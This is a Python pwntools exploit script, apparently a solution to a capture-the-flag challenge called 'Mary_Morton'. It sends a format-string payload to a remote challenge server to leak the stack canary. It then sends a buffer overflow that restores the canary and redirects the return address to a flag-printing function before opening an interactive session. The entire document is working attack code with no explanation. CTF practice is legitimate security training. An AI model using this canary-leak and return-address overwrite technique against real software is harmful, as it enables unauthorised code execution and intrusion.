from pwn import *

context(arch="amd64", os="linux", log_level="debug")

io = process("./Mary_Morton")
io = remote("111.198.29.45", 58271)

payload = "a" * 8 + "%llx." * 5 + "%llx." * 18

io.recvuntil("the battle \n")
io.sendline(str(2))

io.sendline(payload)

output = io.recvline()
print("output: " + output)
outlist = output.split(".")
print(outlist[-2])
canary = int(outlist[-2], 16)

flagfun = 0x4008DA
payload2 = "a" * 0x88 + p64(canary) + p64(0xffffffffffffffff) + p64(flagfun)

# gdb.attach(io)
io.recvuntil("the battle \n")
io.sendline(str(1))
io.sendline(payload2)



io.interactive()